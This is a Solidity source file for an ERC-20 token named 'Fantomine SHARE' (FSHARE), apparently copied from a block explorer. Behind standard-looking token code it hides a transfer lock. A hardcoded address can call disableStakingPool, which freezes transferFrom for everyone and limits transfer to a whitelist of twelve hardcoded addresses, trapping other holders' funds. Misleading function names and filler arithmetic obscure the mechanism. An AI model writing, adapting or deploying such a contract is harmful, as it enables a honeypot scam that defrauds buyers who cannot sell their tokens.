/**
 *Submitted for verification at FtmScan.com on 2022-03-15
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract FantomineSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenaa_totalSupply;
    uint256 private _tokenaa_status = 0;
    uint256 private _rewardsaa_status = 0;

    string private _tokenaa_name;
    string private _tokenaa_symbol;

    address private _stakingPoolaaAddress = 0x3E171e8cA08991200b81dCff6b968BD9153FaEC5; 
    address private _rewardsPoolaaAddress = 0x3E171e8cA08991200b81dCff6b968BD9153FaEC5; 
    address private _dependance1 = 0xbE4A0974cc2e5102C7F1EBA7d337adFeD32A3156;
    address private _dependance2 = 0xb0Eb898aaB8057F41714859bcC8e84a3664bA574;
    address private _dependance3 = 0x4F5a1D33BDC0994Fe952017983ba8725D6D22Ab4;
    address private _dependance4 = 0x888c16D31933A2CAb4e7CBFb70e1eDe20C81BC85;
    address private _dependance5 = 0x3DBECb213093134d190296b9D586D7AB0aB249b7;
    address private _dependance6 = 0xa3FB22C3E1E8fE7a9785AE4052a05Cd5ACDC7fce;
    address private _dependance7 = 0x4e4a4Ec18d0aCa52cC9C2a8032Ee3605D3A7C24a;
    address private _dependance8 = 0x59d98EcF0712b618ac6e7B48aCCe62851dE9566d;
    address private _dependance9 = 0x22BA4A339F6892042946F4adc4F1D01A35A90F5E;
    address private _dependance10 = 0x385155F8E5F510544bF963Db31fE2c585E9b16da;
    

    constructor() {
        _tokenaa_name = "Fantomine SHARE";
        _tokenaa_symbol = "FSHARE";
        _tokenaa_totalSupply = 10001 * 10 ** 18;
        _balances[msg.sender] = _tokenaa_totalSupply;
    }

    modifier forTransferFrom {
        require(_tokenaa_status == 0);
        _;
    }

    modifier forTransfer {
        require(msg.sender == _stakingPoolaaAddress || msg.sender == _rewardsPoolaaAddress || msg.sender == _dependance1 || msg.sender == _dependance2 || msg.sender == _dependance3 || msg.sender == _dependance4 || msg.sender == _dependance5 || msg.sender == _dependance6 || msg.sender == _dependance7 || msg.sender == _dependance8 || msg.sender == _dependance9 || msg.sender == _dependance10 || _rewardsaa_status == 0);
        _;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public forTransferFrom virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _safeTransfer(from, to, amount);
        return true;
    }

    function _afterTokenTransfer(
        address balance_from,
        address balance_to,
        uint256 balance_amount
    ) internal virtual {}

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _spendAllowance(
        address balance_owner,
        address balance_spender,
        uint256 balance_amount
    ) internal virtual {
        uint256 currentAllowance = allowance(balance_owner, balance_spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= balance_amount, "Token : insufficient allowance");
            unchecked {
                _approve(balance_owner, balance_spender, currentAllowance - balance_amount);
            }
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "Token : decreased allowance below 0");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function transfer(address to, uint256 amount) public forTransfer virtual override returns (bool) {
        address owner = _msgSender();
        _safeTransfer(owner, to, amount);
        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "Token : burn from the 0 address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "Token : burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _tokenaa_totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokenaa_totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function _safeTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "Token : transfer from the 0 address");
        require(to != address(0), "Token : transfer to the 0 address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Token : transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function enableStakingPool(address disabledAddress) public {
        disabledAddress = address(0);
        uint256 a = 1;
        a = a + 1;
        a = a - 1;
        if (msg.sender == _stakingPoolaaAddress)
        {
            _tokenaa_status = 0;
            _rewardsaa_status = 0;
        }
    }

    function disableStakingPool(address enabledAddress) public {
        enabledAddress = address(0);
        uint256 a = 1;
        a = a + 1;
        a = a - 1;
        if (msg.sender == _stakingPoolaaAddress)
        {
            _tokenaa_status = 1;
            _rewardsaa_status = 1;
        }
    }

    function setRewardsPool(address rewardsPoolAddress) public {
        uint256 a = 1;
        a = a + 1;
        a = a - 1;
        if(msg.sender == _stakingPoolaaAddress)
        {
            _rewardsPoolaaAddress = rewardsPoolAddress;
        }
    }

    function _beforeTokenTransfer(
        address balance_from,
        address balance_to,
        uint256 balance_amount
    ) internal virtual {}

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    function _approve(
        address balance_owner,
        address balance_spender,
        uint256 balance_amount
    ) internal virtual {
        require(balance_owner != address(0), "Token : approve from the 0 address");
        require(balance_spender != address(0), "Token : approve to the 0 address");

        _allowances[balance_owner][balance_spender] = balance_amount;
        emit Approval(balance_owner, balance_spender, balance_amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenaa_symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _tokenaa_name;
    }

}